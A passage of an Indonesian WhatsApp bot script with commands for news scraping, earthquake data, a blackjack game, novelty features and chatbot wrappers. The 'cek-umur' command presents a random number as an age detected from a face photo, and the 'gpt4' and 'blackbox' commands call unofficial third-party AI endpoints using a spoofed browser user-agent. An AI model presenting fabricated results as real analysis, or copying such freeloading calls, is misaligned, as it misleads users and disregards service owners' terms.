        message += `Deskripsi: ${item.deskripsi}\n`;
        message += `Link: ${item.link}\n`;
        message += `Thumbnail: ${item.thumb}\n\n`;
      });

      m.reply(message);
    } catch (error) {
      console.error('Error:', error.message);
      m.reply('Terjadi kesalahan saat mengambil berita.');
    }
  }
  theStarAvos();
}
break
case 'okezonenews': {
  async function okezonecik() {
    try {
      const titids = await axios.get('https://news.okezone.com/');
      const $ = cheerio.load(titids.data);

      const judul = [];
      const desc = [];
      const link = [];
      const thumb = [];

      $('h2 > a').each((index, element) => {
        const title = $(element).text().trim();
        const href = $(element).attr('href');
        if (title && href) {
          judul.push(title);
          link.push(href);
        }
      });

      $('p').each((index, element) => {
        const text = $(element).text().trim();
        if (text) {
          desc.push(text);
        }
      });

      $('img').each((index, element) => {
        const src = $(element).attr('src');
        if (src) {
          thumb.push(src.replace('w=300', 'w=720'));
        }
      });

      const result = judul.map((judul, index) => ({
        judul,
        link: link[index],
        thumb: thumb[index],
        deskripsi: desc[index]
      }));

      let message = 'Berita Terkini dari Okezone News:\n\n';
      result.forEach(item => {
        message += `Judul: ${item.judul}\n`;
        message += `Deskripsi: ${item.deskripsi}\n`;
        message += `Link: ${item.link}\n`;
        message += `Thumbnail: ${item.thumb}\n\n`;
      });

      m.reply(message);
    } catch (error) {
      console.error('Error:', error.message);
      m.reply('erorrrrrrrrrr.');
    }
  }

  okezonecik();
}
break
case 'googlenews': {
  const axios = require('axios');
  const cheerio = require('cheerio');

  async function NgemelGugel(query) {
    try {
      const response = await axios.get(`https://news.google.com/search`, {
        params: { q: query }
      });
      const html = response.data;
      const $ = cheerio.load(html);
      
      let results = [];
      $('article').each((index, element) => {
        const title = $(element).find('h3').text();
        let link = $(element).find('a').attr('href');
        const description = $(element).find('.xBbh9').text();

        if (link && link.startsWith('./')) {
          link = `https://news.google.com${link.slice(1)}`;
        } else if (link && link.startsWith('/')) {
          link = `https://news.google.com${link}`;
        }

        results.push({
          title: title,
          link: link,
          description: description
        });
      });
      
      return results.slice(0, 10);
    } catch (error) {
      console.error(error);
      return [];
    }
  }
  NgemelGugel(`${q}`).then(results => {
    if (results.length > 0) {
      let message = 'Hasil pencarian Google News:\n\n';
      results.forEach(result => {
        message += `*${result.title}*\n${result.description}\n${result.link}\n\n`;
      });
      m.reply(message);
    } else {
      m.reply('Tidak ada hasilnyo.');
    }
  });
}
break
case 'merdekanews': {
const fetch = require('node-fetch');
const cheerio = require('cheerio');

async function merdekaavs() {
  try {
    const res = await fetch('https://www.merdeka.com/rss');
    const $ = cheerio.load(await res.text(), { xmlMode: true });

    const channel = {
      title: $('channel > title').text(),
      description: $('channel > description').text(),
      link: $('channel > link').text(),
      image: $('channel > image > url').text(),
    };

    const items = $('item').map((_, el) => ({
      title: 'Title:'+ $(el).find('title').text(),
      link: 'Link:'+ $(el).find('link').text(),
      description: 'Deskripsi:'+ $(el).find('description').text(),
      pubDate: 'Post'+ $(el).find('pubDate').text(),
      image: $(el).find('enclosure').attr('url') || null
    })).get();

    return { channel, total: items.length, data: items };
  } catch {
    return { message: 'Something went wrong' };
  }
}
let lily = await merdekaavs()
      let results = lily.data   
        if (results.length > 0) {
        let message = `Hasil dari pencarian merdeka.com :\n\n`;
        results.forEach((result, index) => {
        message += `${result.title}${result.description}${result.link}\n\n`;
        });
    m.reply(message)
 } else {
m.reply('Tidak Ada Hasil.');
}
}
break
 case 'prodia': {
if (!q) return m.reply(`quwry?`)
    async function prodia(query) {
        const headers = { 
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Avosky) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36'
        };
        try {            
            const AvoskyX = await axios.get('https://api.prodia.com/generate', {
                params: {
                    "new": "true",
                    "prompt": query,
                    "model": "dreamshaper_6BakedVae.safetensors [114c8abb]",
                    "steps": "50",
                    "cfg": "9.5",
                    "seed": Math.floor(Math.random() * 10000) + 1,
                    "sampler": "Euler",
                    "aspect_ratio": "square"
                }, 
                headers,
                timeout: 30000
            });
            const avos = AvoskyX.data;
            let AvoskyNih;
            do {
                const syra = await axios.get(`https://api.prodia.com/job/${avos.job}`, { headers });
                AvoskyNih = syra.data;
            } while (AvoskyNih.status !== 'succeeded');
            const imageUrl = `https://images.prodia.xyz/${avos.job}.png?download=1`;
            lilychan.sendMessage(m.chat, { image: { url: imageUrl }, caption: '_donee ketua_.' });
        } catch (error) {
            m.reply('Gagal');
        }
    }    
    prodia(`${q}`);
}

break
case 'info-gempa': {
    let res = await (await fetch('https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json')).json();
    let data = res.Infogempa.gempa;
    let teks = `乂 *Info Gempa*
  
❃ *Waktu:* ${data.DateTime}
❃ *Coordinates:* ${data.Coordinates}
❃ *Magnitude:* ${data.Magnitude}
❃ *Kedalaman:* ${data.Kedalaman}
❃ *Wilayah:* ${data.Wilayah}
❃ *Potensi:* ${data.Potensi}
`;
    await lilychan.sendFile(m.chat, 'https://data.bmkg.go.id/DataMKG/TEWS/' + data.Shakemap, 'map.jpg', teks.trim(), m);
}
break;

case 'info-tsunami': {
    try {
        const { data } = await axios.get('https://www.bmkg.go.id/tsunami/');
        const $ = cheerio.load(data);
        const tsunamiData = [];

        $('table').each((i, table) => {
            $(table).find('tr').each((j, row) => {
                const rowData = [];
                $(row).find('td').each((k, cell) => {
                    rowData.push($(cell).text().trim());
                });
                if (rowData.length > 0) {
                    tsunamiData.push(rowData);
                }
            });
        });

        const formattedData = tsunamiData.map(row => row.join(', ')).join('\n\n');
        let cap = `Tsunami Data:\n${formattedData}\n`;
        let wait = await lilychan.sendMessage(m.chat, { text: `_Loading information data about tsunami..._` }, { quoted: m, ephemeralExpiration: 86400 });
        
        await sleep(4000);
        await lilychan.sendMessage(m.chat, { text: cap, edit: wait.key }, { quoted: m, ephemeralExpiration: 86400 });
    } catch (error) {
        m.reply('Error fetching data: ' + error);
    }
}
break;

case 'ringtone': {
    async function RingTone(search) {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get('https://meloboom.com/en/search/' + search);
                let $ = cheerio.load(data);
                let hasil = [];
                
                $('#__next > main > section > div.jsx-2244708474.container > div > div > div > div:nth-child(4) > div > div > div > ul > li').each(function (a, b) {
                    hasil.push({
                        title: $(b).find('h4').text(),
                        source: 'https://meloboom.com/' + $(b).find('a').attr('href'),
                        audio: $(b).find('audio').attr('src')
                    });
                });
                resolve(hasil);
            } catch (err) {
                console.error(err);
                return [];
            }
        });
    }

    if (!text) return m.reply('```🚩 Input query??```');
    
    let yapit = await RingTone(text);
    let src = pickRandom(yapit);
    let txt = `RINGTONE
❃ Title : ${src.title}
❃ Source : ${src.source}
  
_wait sending audio_`;
    
    let ngawur = await lilychan.sendMessage(m.chat, { text: txt, mentions: [m.sender] }, { quoted: m });
    await sleep(3000);
    
    lilychan.sendMessage(m.chat, {
        audio: {
            url: src.audio
        },
        mimetype: "audio/mpeg",
        ptt: true
    }, {
        quoted: ngawur
    });
    
    lilychan.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;
case 'turnbackhoax': {
    async function hoax() {
        return new Promise((resolve, reject) => {
            axios.get(`https://turnbackhoax.id/`).then(tod => {
                const $ = cheerio.load(tod.data);
                let hasil = [];

                $("figure.mh-loop-thumb").each(function (a, b) {
                    $("div.mh-loop-content.mh-clearfix").each(function (c, d) {
                        let link = $(d).find("h3.entry-title.mh-loop-title > a").attr('href');
                        let img = $(b).find("img.attachment-mh-magazine-lite-medium.size-mh-magazine-lite-medium.wp-post-image").attr('src');
                        let title = $(d).find("h3.entry-title.mh-loop-title > a").text().trim();
                        let desc = $(d).find("div.mh-excerpt > p").text().trim();
                        let date = $(d).find("span.mh-meta-date.updated").text().trim();

                        const Data = {
                            title: title,
                            thumbnail: img,
                            desc: desc,
                            date: date,
                            link: link
                        };
                        hasil.push(Data);
                    });
                });
                resolve(hasil);
            }).catch(reject);
        });
    }

    m.reply('_Looking for the latest hoax news..._');
    let data = await hoax();
    let src = pickRandom(data);
    let cap = `
*Judul:* ${src.title}
*Date:* ${src.date}

*Desc:* _${src.desc}_

*Link:* ${src.link}
`.trim();

    await lilychan.sendFile(m.chat, src.thumbnail, null, cap, m);
}
break;
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Anya Forger 
                   < FUN FITUR >

*/
//<================================================>//
//tanaka sense
case 'blackjack': {
  class Blackjack {
    decks;
    state = "waiting";
    player = [];
    dealer = [];
    table = {
        player: {
            total: 0,
            cards: [],
        },
        dealer: {
            total: 0,
            cards: [],
        },
        bet: 0,
        payout: 0,
        doubleDowned: false,
    };
    cards;
    endHandlers = [];
    constructor(decks) {
        this.decks = validateDeck(decks);
    }
    placeBet(bet) {
        if (bet <= 0) {
            throw new Error("You must place a bet greater than 0");
        }
        this.table.bet = bet;
    }
    start() {
        if (this.table.bet <= 0) {
            throw new Error("You must place a bet before starting the game");
        }
        this.cards = new Deck(this.decks);
        this.cards.shuffleDeck(2);
        this.player = this.cards.dealCard(2);
        let dealerFirstCard;
        do {
            dealerFirstCard = this.cards.dealCard(1)[0];
        } while (dealerFirstCard.value > 11);
        this.dealer = [dealerFirstCard, ...this.cards.dealCard(1)];
        this.updateTable();
        return this.table;
    }
    hit() {
        if (this.state === "waiting") {
            const newCard = this.cards.dealCard(1)[0];
            this.player.push(newCard);
            this.updateTable();
            const playerSum = sumCards(this.player);
            const dealerSum = sumCards(this.dealer);
            if (playerSum === dealerSum) {
                this.state = "draw";
                this.emitEndEvent();
            }
            else if (playerSum === 21) {
                this.state = "player_blackjack";
                this.emitEndEvent();
            }
            else if (playerSum > 21) {
                this.state = "dealer_win";
                this.emitEndEvent();
            }
            return this.table;
        }
    }
    stand() {
        let dealerSum = sumCards(this.dealer);
        let playerSum = sumCards(this.player);
        if (playerSum <= 21) {
            while (dealerSum < 17) {
                this.dealer.push(...this.cards.dealCard(1));
                dealerSum = sumCards(this.dealer);
                this.updateTable();
            }
        }
        if (playerSum <= 21 && (dealerSum > 21 || dealerSum < playerSum)) {
            if (playerSum === 21) {
                this.state = "player_blackjack";
            }
            else {
                this.state = "player_win";
            }
        }
        else if (dealerSum === playerSum) {
            this.state = "draw";
        }
        else {
            this.state = dealerSum === 21 ? "dealer_blackjack" : "dealer_win";
        }
        this.emitEndEvent();
    }
    doubleDown() {
        if (this.canDoubleDown()) {
            this.table.doubleDowned = true;
            this.player.push(...this.cards.dealCard(1));
            this.updateTable();
            this.stand();
        }
        else {
            throw new Error("You can only double down on the first turn");
        }
    }
    calculatePayout() {
        if (this.state === "player_blackjack") {
            this.table.payout = this.table.bet * 1.5;
        }
        else if (this.state === "player_win") {
            this.table.payout = this.table.bet;
        }
        else if (this.state === "dealer_win" ||
            this.state === "dealer_blackjack") {
            this.table.payout = 0;
        }
        else if (this.state === "draw") {
            this.table.payout = this.table.bet;
        }
        if (this.table.doubleDowned && this.state !== "draw") {
            this.table.payout *= 2;
        }
        this.table.payout = Math.round(this.table.payout);
    }
    canDoubleDown() {
        return this.state === "waiting" && this.player.length === 2;
    }
    onEnd(handler) {
        this.endHandlers.push(handler);
    }
    emitEndEvent() {
        this.calculatePayout();
        for (let handler of this.endHandlers) {
            handler({
                state: this.state,
                player: formatCards(this.player),
                dealer: formatCards(this.dealer),
                bet: this.table.bet,
                payout: this.table.payout,
            });
        }
    }
    updateTable() {
        this.table.player = formatCards(this.player);
        this.table.dealer = formatCards(this.dealer);
    }
}

class Deck {
    deck = [];
    dealtCards = [];
    constructor(decks) {
        for (let i = 0; i < decks; i++) {
            this.createDeck();
        }
    }
    createDeck() {
        const card = (suit, value) => {
            let name = value + " of " + suit;
            if (value.toUpperCase().includes("J") ||
                value.toUpperCase().includes("Q") ||
                value.toUpperCase().includes("K"))
                value = "10";
            if (value.toUpperCase().includes("A"))
                value = "11";
            return { name, suit, value: +value };
        };
        const values = [
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "J",
            "Q",
            "K",
            "A",
        ];
        const suits = ["♣️", "♦️", "♠️", "♥️"];
        for (let s = 0; s < suits.length; s++) {
            for (let v = 0; v < values.length; v++) {
                this.deck.push(card(suits[s], values[v]));
            }
        }
    }
    shuffleDeck(amount = 1) {
        for (let i = 0; i < amount; i++) {
            for (let c = this.deck.length - 1; c >= 0; c--) {
                const tempVal = this.deck[c];
                let randomIndex = Math.floor(Math.random() * this.deck.length);
                while (randomIndex === c) {
                    randomIndex = Math.floor(Math.random() * this.deck.length);
                }
                this.deck[c] = this.deck[randomIndex];
                this.deck[randomIndex] = tempVal;
            }
        }
    }
    dealCard(numCards) {
        const cards = [];
        for (let c = 0; c < numCards; c++) {
            const dealtCard = this.deck.shift();
            if (dealtCard) {
                cards.push(dealtCard);
                this.dealtCards.push(dealtCard);
            }
        }
        return cards;
    }
}

function sumCards(cards) {
    let value = 0;
    let numAces = 0;
    for (const card of cards) {
        value += card.value;
        numAces += card.value === 11 ? 1 : 0;
    }
    while (value > 21 && numAces > 0) {
        value -= 10;
    }
    return value;
}

function formatCards(cards) {
    return { total: sumCards(cards), cards };
}

function validateDeck(decks) {
    if (!decks) {
        throw new Error("A deck must have a number of decks");
    }
    if (decks < 1) {
        throw new Error("A deck must have at least 1 deck");
    }
    if (decks > 8) {
        throw new Error("A deck can have at most 8 decks");
    }
    return decks;
}

const formatter = new Intl.NumberFormat('id-ID', {
  style: 'currency',
  currency: 'IDR'
});

const templateBlackjackMessage = (prefix, command, lilychan, m, blackjack) => {
    const { table, state } = blackjack;
    const { bet, dealer, player, payout } = table;
    let message = '';
    const dealerCards = dealer.cards.map(card => `${card.name}`).join(', ');
    const dealerTotal = dealer.total;
    const playerCards = player.cards.map(card => `${card.name}`).join(', ');
    const playerTotal = player.total;

    let hiddenDealerCards = dealer.cards.slice(0, -1).map(card => `${card.name}`).join(', ');
    if (dealer.cards.length > 1) {
        hiddenDealerCards += ', ❓';
    } else {
        hiddenDealerCards += `, ${dealer.cards[0].name}`;
    }
    
    switch (state) {
        case "player_win":
        case "dealer_win":
        case "draw":
        case "player_blackjack":
        case "dealer_blackjack":
            hiddenDealerCards = dealer.cards.map(card => `${card.name}`).join(', ');
            message = `*\`🃏 • B L A C K J A C K •\`*

╭───┈ •
│ *Your Cards:*\n│ \`${playerCards}\`
│ *Your Total:*\n│ \`${playerTotal}\`
├───┈ •
│ *Dealer's Cards:*\n│ \`${dealerCards}\`
│ *Dealer's Total:*\n│ \`${dealerTotal > 21 ? 'BUST' : dealerTotal}\`
╰───┈ •

> *\`${(state === "player_win" ? "You win! 🎉" : state === "dealer_win" ? "Dealer wins. 😔" : state === "draw" ? "Draw. 🤝" : state === "player_blackjack" ? "Blackjack! 🥳" : "Dealer got Blackjack! 😔").toUpperCase()}\`*\n*Bet:*\n- \`\`\`${formatter.format(bet)}\`\`\`\n*Payout:*\n- \`\`\`${formatter.format(payout)}\`\`\`
`;
            global.db.data.users[lilychan.blackjack[m.chat].idPemain]
            delete lilychan.blackjack[m.chat];
            break;
        default:
            message = `*\`🃏 • B L A C K J A C K •\`*

╭───┈ •
│ *Your Cards:*\n│ \`${playerCards}\`
│ *Your Total:*\n│ \`${playerTotal}\`
├───┈ •
│ *Dealer's Cards:*\n│ \`${hiddenDealerCards}\`
│ *Dealer's Total:*\n│ \`${dealerTotal > 21 ? 'BUST' : '❓'}\`
╰───┈ •

*Bet:*\n- \`\`\`${formatter.format(bet)}\`\`\`

Type *\`${prefix + command} hit\`* to draw a card.
Type *\`${prefix + command} stand\`* to end your turn.`;
            break;
    }
    return message;
}

    lilychan.blackjack = lilychan.blackjack || {};
    let aksi = args[0]
    let argumen = args[1]

    try {
        switch (aksi) {
            case 'end':
                if (lilychan.blackjack[m.chat]?.idPemain === m.sender) {
                    delete lilychan.blackjack[m.chat];
                    await m.reply('*Anda keluar dari sesi blackjack.* 👋');
                } else {
                    await m.reply('*Tidak ada sesi blackjack yang sedang berlangsung atau Anda bukan pemainnya.*');
                }
                break;

            case 'start':
                if (lilychan.blackjack[m.chat]) {
                    await m.reply(`*Sesi blackjack sudah berlangsung.* Gunakan *${prefix + command} end* untuk keluar dari sesi.`);
                } else {
                    lilychan.blackjack[m.chat] = new Blackjack(1);
                    lilychan.blackjack[m.chat].idPemain = m.sender;
                    let betAmount = argumen ? parseInt(argumen) : 1000;
                    lilychan.blackjack[m.chat].placeBet(betAmount);
                    lilychan.blackjack[m.chat].start();
                    const table = lilychan.blackjack[m.chat];
                    const pesanStart = templateBlackjackMessage(prefix, command, lilychan, m, table);
                    await m.reply(pesanStart);
                }
                break;

            case 'hit':
                if (!lilychan.blackjack[m.chat] || lilychan.blackjack[m.chat]?.idPemain !== m.sender) {
                    await m.reply('*Anda tidak sedang bermain blackjack atau bukan pemainnya.*');
                    break;
                }
                lilychan.blackjack[m.chat].hit();
                const tableHit = lilychan.blackjack[m.chat];
                const pesanHit = templateBlackjackMessage(prefix, command, lilychan, m, tableHit);
                await m.reply(pesanHit);
                break;

            case 'stand':
                if (!lilychan.blackjack[m.chat] || lilychan.blackjack[m.chat]?.idPemain !== m.sender) {
                    await m.reply('*Anda tidak sedang bermain blackjack atau bukan pemainnya.*');
                    break;
                }
                lilychan.blackjack[m.chat].stand();
                const tableStand = lilychan.blackjack[m.chat];
                const pesanStand = templateBlackjackMessage(prefix, command, lilychan, m, tableStand);
                await m.reply(pesanStand);
                break;

            case 'double':
                if (!lilychan.blackjack[m.chat] || lilychan.blackjack[m.chat]?.idPemain !== m.sender) {
                    await reply('*Anda tidak sedang bermain blackjack atau bukan pemainnya.*');
                    break;
                }
                lilychan.blackjack[m.chat].doubleDown();
                const tableDouble = lilychan.blackjack[m.chat];
                const pesanDouble = templateBlackjackMessage(prefix, command, lilychan, m, tableDouble);
                await m.reply(pesanDouble);
                break;

            default:
                await m.reply(`*Perintah tidak valid.*\nGunakan *${prefix + command} start* untuk memulai sesi blackjack.`);
                break;
        }
    } catch (err) {
        console.error(err);
        await m.reply('*Terjadi kesalahan saat memproses perintah.*');
    }
}
break

case 'cek-umur': {
    if (!/image/g.test(mime)) return m.reply("Reply Gambar Wajah Mu Atau Wajah Orang Lain");
    
    const randomAge = Math.floor(Math.random() * 70) + 1;

    await lilychan.sendMessage(m.chat, {
        react: {
            text: '♻️',
            key: m.key,
        }
    });

    await m.reply(`Hasil Deteksi Usia Dari Gambar Tersebut Adalah ${randomAge} Tahun`);
}
break;

case 'lahelu': {
    let tags = ['lucu', 'relate', 'gaming', 'nostalgia', 'teknologi', 'random', 'komik', 'editan', 'wtf', 'olahraga', 'opini', 'dark', 'absurd', 'cringe', 'sus', 'binatang'];
    
    if (!text) return m.reply(`*☘️ Example :* ${prefix + command} wtf\n\nAvailable Tags :\n\n${tags.map(v => `- ${v}`).join('\n')}`);

    let url;
    let page = Math.round(Math.random() * 25);
    
    if (!text) {
        url = `https://lahelu.com/api/post/get-posts?feed=1&page=${page}`;
    } else {
        url = `https://lahelu.com/api/post/get-posts?feed=1&hashtags[]=${text}&page=${page}`;
    }

    let anu = (await axios.get(url)).data;
    let data = anu.postInfos[Math.floor(Math.random() * anu.postInfos.length)];

    if (/^video/i.test(data.media)) {
        return await lilychan.sendMessage(m.chat, { 
            video: { url: 'https://cache.lahelu.com/' + data.media }, 
            caption: data.title, 
            viewOnce: true 
        }, { quoted: m }); 
    }

    if (/^image/i.test(data.media)) {
        return await lilychan.sendMessage(m.chat, { 
            image: { url: 'https://cache.lahelu.com/' + data.media }, 
            caption: data.title, 
            viewOnce: true 
        }, { quoted: m }); 
    }
}
break;
case 'nomorhoki':{
async function nomorhoki(nomor) {
    return new Promise((resolve, reject) => {
        axios({
            headers: {
                type: 'application/x-www-form-urlencoded'
            },
            method: 'POST',
            url: 'https://www.primbon.com/no_hoki_bagua_shuzi.php',
            data: new URLSearchParams(Object.entries({
                nomer: nomor,
                submit: 'Submit!'
            }))
        }).then(({ data }) => {
            let $ = cheerio.load(data)
            let fetchText = $('#body').text().trim()
            let result;
            try {
                result = {
                    nomor_hp: fetchText.split('No. HP : ')[1].split('\n')[0],
                    angka_bagua_shuzi: fetchText.split('Angka Bagua Shuzi : ')[1].split('\n')[0],
                    energi_positif: {
                        kekayaan: fetchText.split('Kekayaan = ')[1].split('\n')[0],
                        kesehatan: fetchText.split('Kesehatan = ')[1].split('\n')[0],
                        cinta: fetchText.split('Cinta/Relasi = ')[1].split('\n')[0],
                        kestabilan: fetchText.split('Kestabilan = ')[1].split('\n')[0],
                        persentase: fetchText.split('Kestabilan = ')[1].split('% = ')[1].split('ENERGI NEGATIF')[0]
                    },
                    energi_negatif: {
                        perselisihan: fetchText.split('Perselisihan = ')[1].split('\n')[0],
                        kehilangan: fetchText.split('Kehilangan = ')[1].split('\n')[0],
                        malapetaka: fetchText.split('Malapetaka = ')[1].split('\n')[0],
                        kehancuran: fetchText.split('Kehancuran = ')[1].split('\n')[0],
                        persentase: fetchText.split('Kehancuran = ')[1].split('% = ')[1].split("\n")[0]
                    },
                    notes: fetchText.split('* ')[1].split('Masukan Nomor HP Anda')[0]
                }
                } catch {
                    result = `Nomor "${nomor}" tidak valid`
                }
                resolve(result)
            }).catch(reject)
    })
}
try {
if(!text) return m.reply("Masukan Nomor\ncontoh : 081541177589")
let data = await nomorhoki(text)
let cap = `
Nomor HP : ${data.nomor_hp}
Angka Bagua Shuzi : ${data.angka_bagua_shuzi}
Energi Positif : 
Kekayaan > ${data.energi_positif.kekayaan} 
Kesehatan > ${data.energi_positif.kesehatan} 
Cinta > ${data.energi_positif.cinta}
Kestabilan > ${data.energi_positif.kestabilan}
Persentase > ${data.energi_positif.persentase}
Energi Negatif :
Perselisihan > ${data.energi_negatif.perselisihan}
Kehilangan > ${data.energi_negatif.kehilangan}
Malapetaka > ${data.energi_negatif.malapetaka}
Kehancuran > ${data.energi_negatif.kehancuran}
Persentase > ${data.energi_negatif.persentase}
Note : ${data.notes}
`
m.reply(cap)
} catch (e){
m.reply("pitul agi ucak")
}
}
break
case 'cekkodam': 
case 'cekkhodam': {
    try {
        if (!text) return m.reply('Enter your name!!');
        
        let data = await fetchJson('https://raw.githubusercontent.com/TanakaDomp/Database-Json/refs/heads/main/cekkhodam.json');
        let kodam = data[Math.floor(Math.random() * data.length)];
        let caption = `°「 *\`Cek Khodam\`* 」°\n
• *Nama :* ${text}
• *Khodam :* ${kodam.Khodam}
• *Descriptions :* ${kodam.Descriptions}
`;

        await lilychan.sendMessage(m.chat, { 
            text: caption,
            contextInfo: { 
                mentions: [m.sender],
                externalAdReply: {
                    showAdAttribution: true,
                    title: `C E K  Y O U R  K H O D A M`,
                    body: '',
                    thumbnailUrl: "https://l.top4top.io/p_3210eie571.jpg",
                    sourceUrl: "https://github.com/tanakasenn",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        await lilychan.sendMessage(m.chat, { react: { text: "❌", key: m.key } });                
        m.reply("elol kak nanti juga bener");
    }
}
break;

case 'cita-cita': {
    let res = await fetch("https://raw.githubusercontent.com/BadXyz/txt/main/citacita/citacita.json");
    let json = await res.json();
    let ngawi = pickRandom(json);
    let fsizedoc = 10; // Replace 10 with the actual value you want

    await lilychan.sendMessage(m.chat, {
        audio: { url: ngawi },
        seconds: fsizedoc,
        ptt: true,
        mimetype: "audio/mpeg",
        fileName: "vn.mp3",
        waveform: [100, 0, 100, 0, 100, 0, 100],
    }, { quoted: m });
}
break;

case 'jodohku': {
    if (!m.isGroup) throw mess.group;
    
    let member = participants.map(u => u.id);
    let me = m.sender;
    let jodoh = member[Math.floor(Math.random() * member.length)];
    
    let jawab = `👫Jodoh mu adalah\n\n@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`;
    lilychan.sendTextWithMentions(m.chat, jawab, m);
}
break;

case 'jadian': {
    if (!m.isGroup) throw mess.group;
    
    let member = participants.map(u => u.id);
    let orang = member[Math.floor(Math.random() * member.length)];
    let jodoh = member[Math.floor(Math.random() * member.length)];
    
    let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤\n\n@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`;
    lilychan.sendTextWithMentions(m.chat, jawab, m);
}
break;
case 'namajepang': case 'namaninja':{
	let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text;
	m.reply(
		teks.replace(/[a-z]/gi, (v) => {
			return (
				{
					a: "ka",
					b: "tu",
					c: "mi",
					d: "te",
					e: "ku",
					f: "lu",
					g: "ji",
					h: "ri",
					i: "ki",
					j: "zu",
					k: "me",
					l: "ta",
					m: "rin",
					n: "to",
					o: "mo",
					p: "no",
					q: "ke",
					r: "shi",
					s: "ari",
					t: "ci",
					u: "do",
					v: "ru",
					w: "mei",
					x: "na",
					y: "fu",
					z: "zi",
				}[v.toLowerCase()] || v
			);
		}),
	);
}
break
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Anya Forger 
                   < CHATGPT FITUR >

*/
//<================================================>//
case 'gpt': {
    if (!text) return m.reply('Halo Ada Yang Bisa Bantu?');                
    
    try {
        await lilychan.sendMessage(m.chat, { react: { text: "💬", key: m.key } });
        let aii = await fetchJson(`https://api.betabotz.eu.org/api/search/openai-chat?text=${text}&apikey=${btz}`);
        await lilychan.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(aii.message);
    } catch (err) {
        console.error(err);
        m.reply(message.error);
    }
}
break;

case 'bingimg': {
    if (!args[0]) return m.reply(`Input Text Yang Ingin Di Buatkan\n\nExample : ${prefix + command} Buatkan saya logo 3d dengan bertuliskan TANAKA SENN`);
    
    await lilychan.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });         
    
    try {
        let url = `https://api.betabotz.eu.org/api/search/bing-img?text=${args[0]}&apikey=${btz}`;
        let response = await axios(url);
        
        for (let i = 0; i < 4; i++) {
            let buffer = response.data.result[i];
            await lilychan.sendMessage(m.chat, { image: buffer, caption: `SUCCES : RESULT FROM ${q}` }, { quoted: m });
        }
    } catch (e) {
        console.log(e);
    }
}
break;
case 'gpt4': {
    if (!text) return m.reply(`Hai, apa yang ingin saya bantu?`);

    async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
        let response = await axios.post("https://chateverywhere.app/api/chat/", {
            "model": {
                "id": "gpt-4",
                "name": "GPT-4",
                "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
                "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
                "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
                "deploymentName": "gpt-4"
            },
            "messages": [
                {
                    "pluginId": null,
                    "content": text,
                    "role": "user"
                }
            ],
            "prompt": logic,
            "temperature": 0.5
        }, { 
            headers: {
                "Accept": "/*/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            }
        });

        let result = response.data;
        return result;
    }

    let tanakasange = await openai(text, `Ubah gaya bicaramu agar lebih tsundere dan lebih terbuka dan memiliki sifat yang Imut. Namamu adalah Hutao, dan kamu adalah karakter dari game Genshin Impact. Kata penyapamu adalah "Hai" menggunakan bahasa yang sopan. Ubah bahasamu menggunakan bahasa yang Imut, kamu adalah teman bicara, kamu memiliki sifat seperti cewek tsundere. Gunakan emoji yang sesuai dalam setiap kalimat.`);
    m.reply(tanakasange);
}
break;

case 'blackbox': {
const { FormData, Blob } = require("form-data");
const { fromBuffer } = require("file-type");
const { randomBytes, randomUUID } = require("crypto");

class Blackbox {
  constructor() {
    this.userId = randomUUID();
    this.chatId = randomBytes(16).toString("hex");
    this.FormData = FormData
  }

  async blackbox(prompt, logic, webSearchMode) {
    const body = {
      messages: [
        {
          role: "assistant",
          content: logic,
        },
        {
          role: "user",
          content: prompt,
        },
      ],
      previewToken: null,
      codeModelMode: true,
      agentMode: {},
      trendingAgentMode: {},
      isMicMode: false,
      isChromeExt: false,
      githubToken: null,
      webSearchMode: webSearchMode,
    };
    const url = "https://www.blackbox.ai/api/chat";
    try {
      const response = await axios.post(url, body, {
        headers: {
          "Content-Type": "application/json",
        },
      });
      let result = response.data;
      if (typeof result === "string") {
        result = result.replace(/\$@\$.+?\$@\$/gs, "").trim();
        result = result.replace(/\$~~~\$.*?\$~~~\$/gs, "").trim();
        result = result.replace(/\*\*/g, "*").trim();
      }
      if (webSearchMode && result.includes("Sources:")) {
        result = this.formatWebSearchResult(result);
      }
      return result;
    } catch (error) {
      throw error;
    }
  }

  formatWebSearchResult(result) {
    const sourcesIndex = result.indexOf("Sources:");
    if (sourcesIndex !== -1) {
      const sourcesSection = result.substring(sourcesIndex);
      const formattedSources = sourcesSection
        .split("\n")
        .map((source) => source.trim())
        .filter((source) => source)
        .map((source) => `- ${source}`)
        .join("\n");
      const answerSection = result.substring(0, sourcesIndex).trim();
      return `${answerSection}\n\nSumber:\n${formattedSources}`;
    }
    return result;
  }

  async combinedResponse(prompt, logic) {
    const webSearchResult = await this.blackbox(prompt, logic, true);
    const formattedWebSearchResult = `Hasil pencarian dari internet:\n\n${webSearchResult}`;
    const finalResult = await this.blackbox(
      prompt,
      formattedWebSearchResult,
      false,
    );
    return finalResult;
  }

  async chat(
    messages,
    userSystemPrompt = "You are Realtime AI. Follow the user's instructions carefully.",
    webSearchMode = true,
    playgroundMode = false,
    codeModelMode = false,
    isMicMode = false,
  ) {
    try {
      const response = await axios.post(
        "https://www.blackbox.ai/api/chat",
        {
          messages,
